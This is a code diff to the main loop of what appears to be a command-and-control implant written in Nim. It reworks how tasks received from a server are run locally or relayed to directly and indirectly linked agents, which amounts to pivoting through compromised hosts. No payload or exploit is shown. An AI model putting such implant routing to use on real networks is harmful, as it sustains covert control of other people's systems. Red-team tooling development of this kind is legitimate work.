@@ -69,26 +69,14 @@ proc main() =
                 print protect("[*] No tasks to execute.")
                 continue
 
-            echo tasks
-
-            # Execute all retrieved tasks and return their output to the server
+            # Handle task execution
             var packer = Packer.init()
             var numResults: int = 0
+            var directLinkedTasks = initTable[string, seq[seq[byte]]]() 
+            var indirectPacker = Packer.init()    
 
-            # Collect tasks that are meant for the children of linked agents
-            # These tasks are forwarded to all linked agents until the eventually reach their destination
-            for agentId, agentTasks in tasks: 
-                if not ctx.links.hasKey(string.toUuid(agentId)) and agentId != ctx.agentId: 
-                    packer.add(string.toUuid(agentId))
-                    packer.add(cast[uint8](agentTasks.len()))
-                    for task in agentTasks:
-                        packer.addDataWithLengthPrefix(task)
-            let indirectChildTasks = packer.pack()
-            packer.reset()
-
-            # Handle task execution 
             for agentId, agentTasks in tasks:
-
+                
                 # Execute tasks belonging to the current agent 
                 if agentId == ctx.agentId:
                     for task in agentTasks:
@@ -97,10 +85,25 @@ proc main() =
                         inc numResults
                         packer.addDataWithLengthPrefix(resultBytes)
 
-                # Forward remaining tasks to directly linked agents
-                elif ctx.links.hasKey(string.toUuid(agentId)):
-                    if ctx.forward(agentId, agentTasks, indirectChildTasks):
-                        print fmt"    [+] Forwarding tasks to agent {agentId}."  
+                # If the task is for a direct child it is not forwarded to all linked agents, only to the one it is for
+                elif ctx.links.hasKey(string.toUuid(agentId)): 
+                    directLinkedTasks[agentId] = agentTasks
+
+                # Pack tasks that need to be forwarded to linked agents
+                else: 
+                    indirectPacker.add(string.toUuid(agentId))
+                    indirectPacker.add(cast[uint8](agentTasks.len()))
+                    for task in agentTasks:
+                        indirectPacker.addDataWithLengthPrefix(task)
+    
+            let indirectTasks = indirectPacker.pack()
+            for linkedAgentId in ctx.links.keys:
+                let directTasks = directLinkedTasks.getOrDefault(Uuid.toString(linkedAgentId), @[])
+
+                # Forward direct and indirect tasks to the directly linked children
+                if directTasks.len() > 0 or indirectTasks.len() > 0:
+                    if ctx.forward(linkedAgentId, directTasks, indirectTasks):
+                        print fmt"   [+] Forwarding tasks to agent {Uuid.toString(linkedAgentId)}."
 
             ctx.sendData(@[uint8(numResults)] & packer.pack())
 
